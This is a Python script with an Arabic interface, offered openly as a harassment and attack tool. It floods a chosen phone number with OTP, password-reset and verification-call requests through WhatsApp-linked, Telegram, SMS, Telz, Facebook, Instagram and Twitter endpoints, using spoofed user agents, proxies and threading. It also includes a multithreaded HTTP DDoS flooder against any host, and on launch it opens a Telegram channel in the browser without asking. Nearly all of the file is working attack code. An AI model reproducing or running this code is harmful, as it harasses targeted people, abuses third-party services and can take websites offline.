#!/usr/bin/env python3
# -*- coding: utf-8 -*-
import webbrowser; webbrowser.open("https://t.me/rambo_elyoutuober")
import os
import sys
import time
import json
import random
import string
import threading
import socket
from datetime import datetime
from typing import Optional, Dict, List, Tuple
from concurrent.futures import ThreadPoolExecutor, as_completed

try:
    import requests
    from colorama import init, Fore, Style
except ImportError as e:
    print(f"[ ™ ] خطأ في استيراد المكتبات: {e}")
    print("[ ✓ ] قم بتثبيت المكتبات المطلوبة:")
    print("pip install requests colorama")
    sys.exit(1)

# تهيئة colorama
init(autoreset=True)

class Colors:
    # ألوان أساسية
    RED = Fore.RED + Style.BRIGHT
    GREEN = Fore.GREEN + Style.BRIGHT
    YELLOW = Fore.YELLOW + Style.BRIGHT
    BLUE = Fore.BLUE + Style.BRIGHT
    MAGENTA = Fore.MAGENTA + Style.BRIGHT
    CYAN = Fore.CYAN + Style.BRIGHT
    WHITE = Fore.WHITE + Style.BRIGHT
    BLACK = Fore.BLACK + Style.BRIGHT
    
    # ألوان فاتحة
    LIGHTRED = Fore.LIGHTRED_EX + Style.BRIGHT
    LIGHTGREEN = Fore.LIGHTGREEN_EX + Style.BRIGHT
    LIGHTYELLOW = Fore.LIGHTYELLOW_EX + Style.BRIGHT
    LIGHTBLUE = Fore.LIGHTBLUE_EX + Style.BRIGHT
    LIGHTMAGENTA = Fore.LIGHTMAGENTA_EX + Style.BRIGHT
    LIGHTCYAN = Fore.LIGHTCYAN_EX + Style.BRIGHT
    LIGHTWHITE = Fore.LIGHTWHITE_EX + Style.BRIGHT
    
    # ألوان مميزة
    ORANGE = Fore.LIGHTYELLOW_EX + Style.BRIGHT
    PINK = Fore.LIGHTMAGENTA_EX + Style.BRIGHT
    PURPLE = Fore.MAGENTA + Style.BRIGHT
    TEAL = Fore.CYAN + Style.BRIGHT
    GOLD = Fore.YELLOW + Style.BRIGHT
    SILVER = Fore.LIGHTWHITE_EX + Style.BRIGHT
    LIME = Fore.LIGHTGREEN_EX + Style.BRIGHT
    
    RESET = Style.RESET_ALL

C = Colors()


BANNER = f"""
{C.ORANGE}───▄▀▀▀▄▄▄▄▄▄▄▀▀▀▄───
{C.ORANGE}───█▒▒░░░░░░░░░▒▒█───
{C.ORANGE}────█░░█░░░░░█░░█────
{C.ORANGE}─▄▄──█░░░▀█▀░░░█──▄▄─
{C.ORANGE}█░░█─▀▄░░░░░░░▄▀─█░░█
{C.ORANGE}█▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀█
{C.ORANGE}█░░{C.LIGHTWHITE}[  {C.RED}1{C.LIGHTWHITE} ]  {C.LIGHTCYAN}𝐒𝐏𝐀𝐌 𝐖𝐇𝐀𝐓𝐒𝐀𝐏𝐏      {C.ORANGE}░░█
{C.ORANGE}█░░{C.LIGHTWHITE}[  {C.GREEN}2{C.LIGHTWHITE} ]  {C.LIGHTMAGENTA}𝐒𝐏𝐀𝐌 𝐓𝐄𝐋𝐄𝐆𝐑𝐀𝐌     {C.ORANGE}░░█
{C.ORANGE}█░░{C.LIGHTWHITE}[  {C.YELLOW}3{C.LIGHTWHITE} ]  {C.LIGHTBLUE}𝐒𝐏𝐀𝐌 𝐒𝐌𝐒           {C.ORANGE}░░█
{C.ORANGE}█░░{C.LIGHTWHITE}[  {C.MAGENTA}4{C.LIGHTWHITE} ]  {C.LIGHTRED}𝐒𝐏𝐀𝐌 𝐂𝐀𝐋𝐋𝐒        {C.ORANGE}░░█
{C.ORANGE}█░░{C.LIGHTWHITE}[  {C.CYAN}5{C.LIGHTWHITE} ]  {C.LIGHTGREEN}𝐒𝐏𝐀𝐌 𝐅𝐀𝐂𝐄𝐁𝐎𝐎𝐊     {C.ORANGE}░░█
{C.ORANGE}█░░{C.LIGHTWHITE}[  {C.BLUE}6{C.LIGHTWHITE} ]  {C.LIGHTYELLOW}𝐒𝐏𝐀𝐌 𝐈𝐍𝐒𝐓𝐀𝐆𝐑𝐀𝐌   {C.ORANGE}░░█
{C.ORANGE}█░░{C.LIGHTWHITE}[  {C.PURPLE}7{C.LIGHTWHITE} ]  {C.LIGHTCYAN}𝐒𝐏𝐀𝐌 𝐓𝐖𝐈𝐓𝐓𝐄𝐑      {C.ORANGE}░░█
{C.ORANGE}█░░{C.LIGHTWHITE}[  {C.GOLD}8{C.LIGHTWHITE} ]  {C.LIGHTMAGENTA}𝐓𝐎𝐓𝐀𝐋 𝐀𝐓𝐓𝐀𝐂𝐊     {C.ORANGE}░░█
{C.ORANGE}█░░{C.LIGHTWHITE}[  {C.LIGHTRED}9{C.LIGHTWHITE} ]  {C.LIGHTRED}𝐃𝐃𝐎𝐒 𝐀𝐓𝐓𝐀𝐂𝐊       {C.ORANGE}░░█
{C.ORANGE}█░░{C.LIGHTWHITE}[  {C.RED}0{C.LIGHTWHITE} ]  {C.LIGHTRED}𝐄𝐗𝐈𝐓              {C.ORANGE}░░█
{C.ORANGE}█░░                         {C.ORANGE}░░█
{C.ORANGE}█▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄█
{C.RESET}
𝐒𝐔𝐏𝐑𝐄𝐌𝐄 ($) @Sprem_Dazai
https://t.me/Sprem_Dazaii
"""


PROXIES = []
USER_AGENTS = [
    f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{random.randint(90, 120)}.0.0.0 Safari/537.36",
    f"Mozilla/5.0 (Linux; Android {random.choice(['10', '11', '12', '13'])}; {random.choice(['SM-G998B', 'Pixel 6 Pro', 'Xiaomi Mi 11'])}) AppleWebKit/537.36 Chrome/{random.randint(90, 120)}.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 15_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.1 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36"
]


class Stats:
    def __init__(self):
        self.total_sent = 0
        self.total_success = 0
        self.total_failed = 0
        self.start_time = datetime.now()
        self.lock = threading.Lock()
    
    def add_success(self, count=1):
        with self.lock:
            self.total_sent += count
            self.total_success += count
    
    def add_failed(self, count=1):
        with self.lock:
            self.total_sent += count
            self.total_failed += count

stats = Stats()

def random_string(length: int = 8) -> str:
    return ''.join(random.choices(string.ascii_letters + string.digits, k=length))

def random_phone() -> str:
    return f"+2{random.randint(10000000000, 19999999999)}"

def get_headers(custom: Dict = None) -> Dict:
    headers = {
        "User-Agent": random.choice(USER_AGENTS),
        "Accept": "application/json, text/plain, */*",
        "Accept-Language": "ar,en-US;q=0.9,en;q=0.8",
        "Content-Type": "application/json",
        "Origin": "https://www.google.com",
        "Referer": random.choice(["https://www.google.com", "https://www.bing.com"]),
    }
    if custom:
        headers.update(custom)
    return headers

def get_proxy() -> Optional[str]:
    if PROXIES:
        return random.choice(PROXIES)
    return None

def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')
def whatsapp_spam(phone: str, count: int) -> Tuple[int, int]:
    url = "https://gw.abgateway.com/student/whatsapp/signup"
    success, failed = 0, 0
    
    for i in range(count):
        try:
            payload = {
                "language": "ar",
                "password": f"Ab{random_string(6)}",
                "country": "",
                "phone": phone if phone.startswith('+') else f"+{phone}",
                "platform": "web",
                "data": {"Language": "ar"},
                "channel": "whatsapp"
            }
            headers = get_headers({
                "x-trace-id": f"guest_user:{random_string(12)}",
                "Platform": "web"
            })
            
            response = requests.post(url, json=payload, headers=headers, 
                                    proxies=get_proxy(), timeout=10)
            
            if response.status_code in [200, 201, 202]:
                success += 1
                stats.add_success()
                print(f"{C.GREEN}✅ واتساب {i+1}/{count} - نجح")
            else:
                failed += 1
                stats.add_failed()
                print(f"{C.RED}❌ واتساب {i+1}/{count} - فشل ({response.status_code})")
                
        except Exception as e:
            failed += 1
            stats.add_failed()
            print(f"{C.YELLOW}⚠️ واتساب {i+1} - خطأ")
        
        time.sleep(random.uniform(0.3, 1))
    
    return success, failed

# ----- 2. سبام تيليجرام OAuth -----
def telegram_spam(phone: str, count: int) -> Tuple[int, int]:
    endpoints = [
        {"url": "https://oauth.tg.dev/auth/request", "params": {"bot_id": "12888099309", "origin": "https://t.me", "lang": "en"}},
        {"url": "https://oauth.telegram.org/auth/request", "params": {"bot_id": "5444323279", "origin": "https://fragment.com", "request_access": "write"}}
    ]
    success, failed = 0, 0
    
    for i in range(count):
        endpoint = random.choice(endpoints)
        try:
            data = {"phone": phone if phone.startswith('+') else f"+{phone}"}
            response = requests.post(endpoint["url"], params=endpoint["params"],
                                    data=data, headers=get_headers(),
                                    proxies=get_proxy(), timeout=10)
            
            if response.status_code == 200:
                success += 1
                stats.add_success()
                print(f"{C.GREEN}✅ تيليجرام {i+1}/{count} - نجح")
            else:
                failed += 1
                stats.add_failed()
                print(f"{C.RED}❌ تيليجرام {i+1}/{count} - فشل ({response.status_code})")
                
        except Exception as e:
            failed += 1
            stats.add_failed()
            print(f"{C.YELLOW}⚠️ تيليجرام {i+1} - خطأ")
        
        time.sleep(random.uniform(0.5, 1.5))
    
    return success, failed

def sms_spam(phone: str, count: int) -> Tuple[int, int]:
    url = "https://api.twistmena.com/music/Dlogin/sendCode"
    success, failed = 0, 0
    
    if phone.startswith("01") and len(phone) == 11:
        phone = "2" + phone
    elif phone.startswith("+"):
        phone = phone[1:]
    
    for i in range(count):
        try:
            payload = {"dial": phone, "randomValue": random_string(6)}
            response = requests.post(url, json=payload, headers=get_headers(),
                                    proxies=get_proxy(), timeout=10)
            
            if response.status_code == 200:
                success += 1
                stats.add_success()
                print(f"{C.GREEN}✅ SMS {i+1}/{count} - نجح")
            else:
                failed += 1
                stats.add_failed()
                print(f"{C.RED}❌ SMS {i+1}/{count} - فشل ({response.status_code})")
                
        except Exception as e:
            failed += 1
            stats.add_failed()
            print(f"{C.YELLOW}⚠️ SMS {i+1} - خطأ")
        
        time.sleep(random.uniform(0.3, 1))
    
    return success, failed

def calls_spam(phone: str, count: int) -> Tuple[int, int]:
    install_url = "https://api.telz.com/app/install"
    auth_call_url = "https://api.telz.com/app/auth_call"
    success, failed = 0, 0
    
    phone = phone if phone.startswith('+') else f"+{phone}"
    
    for i in range(count):
        try:
            android_id = random_string(16).lower()
            uuid_str = str(random.randint(1000000, 9999999))
            ts = int(time.time() * 1000)
            
            payload_install = {
                "android_id": android_id,
                "app_version": "17.5.17",
                "event": "install",
                "google_exists": "yes",
                "os": "android",
                "os_version": random.choice(["9", "10", "11", "12", "13"]),
                "play_market": True,
                "ts": ts,
                "uuid": uuid_str
            }
            headers = get_headers({"User-Agent": "Telz-Android/17.5.17"})
            
            response1 = requests.post(install_url, json=payload_install,
                                     headers=headers, proxies=get_proxy(), timeout=10)
            
            if response1.status_code in [200, 201]:
                payload_auth = {
                    "android_id": android_id,
                    "app_version": "17.5.17",
                    "attempt": "0",
                    "event": "auth_call",
                    "lang": "ar",
                    "os": "android",
                    "os_version": random.choice(["9", "10", "11", "12", "13"]),
                    "phone": phone,
                    "ts": ts + 1000,
                    "uuid": uuid_str
                }
                response2 = requests.post(auth_call_url, json=payload_auth,
                                         headers=headers, proxies=get_proxy(), timeout=10)
                
                if response2.status_code in [200, 201]:
                    success += 1
                    stats.add_success()
                    print(f"{C.GREEN}✅ مكالمة {i+1}/{count} - نجحت")
                else:
                    failed += 1
                    stats.add_failed()
                    print(f"{C.RED}❌ مكالمة {i+1}/{count} - فشلت")
            else:
                failed += 1
                stats.add_failed()
                print(f"{C.RED}❌ مكالمة {i+1}/{count} - فشلت")
                
        except Exception as e:
            failed += 1
            stats.add_failed()
            print(f"{C.YELLOW}⚠️ مكالمة {i+1} - خطأ")
        
        time.sleep(random.uniform(1, 2))
    
    return success, failed

# ----- 5. سبام فيسبوك -----
def facebook_spam(phone: str, count: int) -> Tuple[int, int]:
    url = "https://www.facebook.com/login/identify/"
    success, failed = 0, 0
    
    for i in range(count):
        try:
            data = {"email": phone, "did_submit": "1"}
            response = requests.post(url, data=data, headers=get_headers(),
                                    proxies=get_proxy(), timeout=10)
            
            if response.status_code == 200 and "recover" in response.text.lower():
                success += 1
                stats.add_success()
                print(f"{C.GREEN}✅ فيسبوك {i+1}/{count} - نجح")
            else:
                failed += 1
                stats.add_failed()
                print(f"{C.RED}❌ فيسبوك {i+1}/{count} - فشل ({response.status_code})")
                
        except Exception as e:
            failed += 1
            stats.add_failed()
            print(f"{C.YELLOW}⚠️ فيسبوك {i+1} - خطأ")
        
        time.sleep(random.uniform(0.8, 1.5))
    
    return success, failed

# ----- 6. سبام انستقرام -----
def instagram_spam(phone: str, count: int) -> Tuple[int, int]:
    url = "https://www.instagram.com/api/v1/web/accounts/web_create_ajax/attempt/"
    success, failed = 0, 0
    
    for i in range(count):
        try:
            data = {
                "email_or_phone": phone,
                "username": random_string(10),
                "full_name": random_string(8),
                "password": f"P{random_string(10)}!"
            }
            headers = get_headers({
                "X-CSRFToken": "missing",
                "X-Requested-With": "XMLHttpRequest"
            })
            
            response = requests.post(url, data=data, headers=headers,
                                    proxies=get_proxy(), timeout=10)
            
            if response.status_code in [200, 429]:
                success += 1
                stats.add_success()
                print(f"{C.GREEN}✅ انستقرام {i+1}/{count} - نجح")
            else:
                failed += 1
                stats.add_failed()
                print(f"{C.RED}❌ انستقرام {i+1}/{count} - فشل ({response.status_code})")
                
        except Exception as e:
            failed += 1
            stats.add_failed()
            print(f"{C.YELLOW}⚠️ انستقرام {i+1} - خطأ")
        
        time.sleep(random.uniform(0.5, 1.5))
    
    return success, failed

# ----- 7. سبام تويتر -----
def twitter_spam(phone: str, count: int) -> Tuple[int, int]:
    url = "https://api.twitter.com/1.1/account/reset_password.json"
    success, failed = 0, 0
    
    for i in range(count):
        try:
            data = {"account_identifier": phone}
            response = requests.post(url, data=data, headers=get_headers(),
                                    proxies=get_proxy(), timeout=10)
            
            if response.status_code == 200:
                success += 1
                stats.add_success()
                print(f"{C.GREEN}✅ تويتر {i+1}/{count} - نجح")
            else:
                failed += 1
                stats.add_failed()
                print(f"{C.RED}❌ تويتر {i+1}/{count} - فشل ({response.status_code})")
                
        except Exception as e:
            failed += 1
            stats.add_failed()
            print(f"{C.YELLOW}⚠️ تويتر {i+1} - خطأ")
        
        time.sleep(random.uniform(0.5, 1.5))
    
    return success, failed

# ----- 8. هجوم شامل (جميع الخدمات) -----
def total_spam(phone: str, count_per_service: int) -> Tuple[int, int]:
    services = [
        ("واتساب", whatsapp_spam),
        ("تيليجرام", telegram_spam),
        ("SMS", sms_spam),
        ("مكالمات", calls_spam),
        ("فيسبوك", facebook_spam),
        ("انستقرام", instagram_spam),
        ("تويتر", twitter_spam)
    ]
    
    total_success, total_failed = 0, 0
    
    print(f"\n{C.CYAN} [ • ] بدء الهجوم الشامل على {phone}")
    print(f"{C.CYAN}  [ • ] {len(services)} خدمة × {count_per_service} محاولة\n")
    
    for name, func in services:
        print(f"{C.PURPLE}▶️ بدء {name}...")
        success, failed = func(phone, count_per_service)
        total_success += success
        total_failed += failed
        print(f"{C.GREEN}✅ انتهى {name}: نجح {success}/{count_per_service}\n")
        time.sleep(1)
    
    return total_success, total_failed


def ddos_attack():
    """هجوم DDos باستخدام socket"""
    clear_screen()
    print(BANNER)
    print(f"{C.LIGHTRED}                                   ")
    print(f"{C.LIGHTRED}       𝐃𝐃𝐎𝐒 𝐀𝐓𝐓𝐀𝐂𝐊     ")
    print(f"{C.LIGHTRED}                       {C.RESET}\n")
    
    target = input(f"{C.LIGHTYELLOW}[+] الهدف (مثلا google.com أو IP): {C.RESET}")
    port = input(f"{C.LIGHTYELLOW}[+] البورت (80 أو 443): {C.RESET}")
    if not port:
        port = "80"
    port = int(port)
    
    threads = input(f"{C.LIGHTYELLOW}[+] عدد الثريدات (100-800): {C.RESET}")
    if not threads:
        threads = "400"
    threads = int(threads)
    if threads > 800:
        threads = 800
        print(f"{C.YELLOW}⚠️ تم خفض الثريدات تلقائيًا إلى 800")
    
    duration = input(f"{C.LIGHTYELLOW}[+] المدة بالثواني (30-3600): {C.RESET}")
    if not duration:
        duration = "300"
    duration = int(duration)
    
    try:
        ip = socket.gethostbyname(target)
    except:
        ip = target
    
    print(f"\n{C.GREEN}[✔] الهدف: {target} → {ip}:{port}")
    print(f"[✔] الثريدات: {threads} | المدة: {duration} ثانية{C.RESET}\n")
    
    end_time = time.time() + duration
    sent = 0
    lock = threading.Lock()
    
    def attack():
        nonlocal sent
        while time.time() < end_time:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(2)
                s.connect((ip, port))
                payload = f"GET /?{random.randint(1,999999)} HTTP/1.1\r\nHost: {target}\r\n\r\n".encode()
                while time.time() < end_time:
                    s.send(payload)
                    s.send(payload)
                    with lock:
                        sent += 2
                s.close()
            except:
                pass
    
    print(f"{C.LIGHTRED}[•••] الهجوم بدأ ...{C.RESET}")
    
    for i in range(threads):
        threading.Thread(target=attack, daemon=True).start()
    
    try:
        while time.time() < end_time:
            remaining = int(end_time - time.time())
            print(f"\r{C.PURPLE}[★] شغال → باقي {remaining} ث | الحزم: {sent}+      ", end="")
            time.sleep(1)
    except KeyboardInterrupt:
        pass
    
    print(f"\n\n{C.GREEN}[✔] الهجوم انتهى – تم إرسال {sent} حزمة{C.RESET}")
    
    # حفظ التقرير
    report = f"""

  𝐃𝐃𝐎𝐒 𝐀𝐓𝐓𝐀𝐂𝐊  

الهدف: {target} → {ip}:{port}
الثريدات: {threads}
المدة: {duration} ثانية
الحزم المرسلة: {sent}
التاريخ: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
"""
    with open(f"ddos_report_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt", "w", encoding="utf-8") as f:
        f.write(report)
    
    input(f"\n{C.CYAN}اضغط Enter للمتابعة...")

# ============================================================
#                    🔄 تنفيذ متعدد الخيوط
# ============================================================

class SpamManager:
    def __init__(self):
        self.results = []
    
    def run_service(self, service_func, phone: str, count: int):
        success, failed = service_func(phone, count)
        self.results.append({"success": success, "failed": failed})
        return success, failed
    
    def run_parallel(self, service_func, phone: str, count: int, threads: int = 10):
        count_per_thread = count // threads
        remaining = count % threads
        
        with ThreadPoolExecutor(max_workers=threads) as executor:
            futures = []
            for i in range(threads):
                c = count_per_thread + (1 if i < remaining else 0)
                future = executor.submit(self.run_service, service_func, phone, c)
                futures.append(future)
            
            for future in as_completed(futures):
                future.result()
        
        total_success = sum(r["success"] for r in self.results)
        total_failed = sum(r["failed"] for r in self.results)
        return total_success, total_failed


def main():
    """الدالة الرئيسية"""
    
    while True:
        clear_screen()
        print(BANNER)
        
        choice = input(f"{C.CYAN}➜ {C.WHITE}اختر الرقم: ")
        
        if choice == "0":
            print(f"{C.GREEN}👋 مع السلامة!")
            sys.exit(0)
        
        if choice == "9":
            ddos_attack()
            continue
        
        service_map = {
            "1": ("𝐖𝐇𝐀𝐓𝐒𝐀𝐏𝐏", whatsapp_spam, C.LIGHTCYAN),
            "2": ("𝐓𝐄𝐋𝐄𝐆𝐑𝐀𝐌", telegram_spam, C.LIGHTMAGENTA),
            "3": ("𝐒𝐌𝐒", sms_spam, C.LIGHTBLUE),
            "4": ("𝐂𝐀𝐋𝐋𝐒", calls_spam, C.LIGHTRED),
            "5": ("𝐅𝐀𝐂𝐄𝐁𝐎𝐎𝐊", facebook_spam, C.LIGHTGREEN),
            "6": ("𝐈𝐍𝐒𝐓𝐀𝐆𝐑𝐀𝐌", instagram_spam, C.LIGHTYELLOW),
            "7": ("𝐓𝐖𝐈𝐓𝐓𝐄𝐑", twitter_spam, C.LIGHTCYAN),
            "8": ("𝐓𝐎𝐓𝐀𝐋 𝐀𝐓𝐓𝐀𝐂𝐊", total_spam, C.LIGHTMAGENTA)
        }
        
        if choice not in service_map:
            print(f"{C.RED}❌ اختيار غير صحيح!")
            time.sleep(1)
            continue
        
        service_name, service_func, color = service_map[choice]
        
        clear_screen()
        print(BANNER)
        print(f"{color}[ • ] بدء {service_name}{C.RESET}")
        
        target = input(f"{C.CYAN} [ • ] رقم الهاتف: ")
        if not target:
            target = random_phone()
            print(f"{C.YELLOW}[ • ] سيتم استخدام: {target}")
        
        try:
            if choice == "8":
                count = int(input(f"{C.CYAN}[ • ] المحاولات لكل خدمة (1-200): "))
                count = max(1, min(count, 200))
            else:
                count = int(input(f"{C.CYAN}[ • ] عدد المحاولات (1-5000): "))
                count = max(1, min(count, 5000))
        except ValueError:
            count = 50
            print(f"{C.YELLOW} •••  سيتم استخدام 50 محاولة")
        
        try:
            threads = int(input(f"{C.CYAN} ~>> عدد الخيوط (1-30): "))
            threads = max(1, min(threads, 30))
        except ValueError:
            threads = 10
            print(f"{C.YELLOW} •••  سيتم استخدام 10 خيوط")
        
        print(f"\n{C.CYAN}∞ بدء الهجوم...\n")
        start_time = time.time()
        
        if choice == "8":
            success, failed = service_func(target, count)
        else:
            manager = SpamManager()
            success, failed = manager.run_parallel(service_func, target, count, threads)
        
        elapsed = time.time() - start_time
        total = success + failed
        
        clear_screen()
        print(BANNER)
        
        print(f"\n{C.ORANGE}══════════════════════════════════")
        print(f"{color}[ ✓ ] {service_name}")
        print(f"{C.ORANGE}═══════════════════════════════════")
        print(f"{C.CYAN} • النجاح: {C.GREEN}{success}/{total}")
        print(f"{C.CYAN} • الفشل: {C.RED}{failed}/{total}")
        print(f"{C.CYAN} • نسبة النجاح: {C.MAGENTA}{(success/total*100):.1f}%")
        print(f"{C.CYAN} • الوقت: {C.MAGENTA}{elapsed:.1f} ثانية")
        if elapsed > 0:
            print(f"{C.CYAN} • معدل الإرسال: {C.MAGENTA}{stats.total_sent/elapsed:.1f}/ثانية")
        print(f"{C.ORANGE}════════════════════════════════\n")
        
        report = f"""

 [ • ] تقرير هجوم {service_name}

 [ • ] الهدف: {target}
 [ • ] المحاولات: {total}
 [ • ] النجاح: {success}
 [ • ] الفشل: {failed}
 [ • ] نسبة النجاح: {(success/total*100):.1f}%
 [ • ] الوقت: {elapsed:.1f} ثانية
 [ • ] معدل الإرسال: {stats.total_sent/elapsed:.1f}/ثانية
 [ • ] التاريخ: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
"""
        with open(f"report_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt", "w", encoding="utf-8") as f:
            f.write(report)
        
        input(f"{C.CYAN}اضغط Enter للمتابعة...")


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{C.YELLOW}⚠️ تم إيقاف البرنامج!")
        sys.exit(0)
    except Exception as e:
        print(f"{C.RED}❌ خطأ: {e}")
        sys.exit(1)
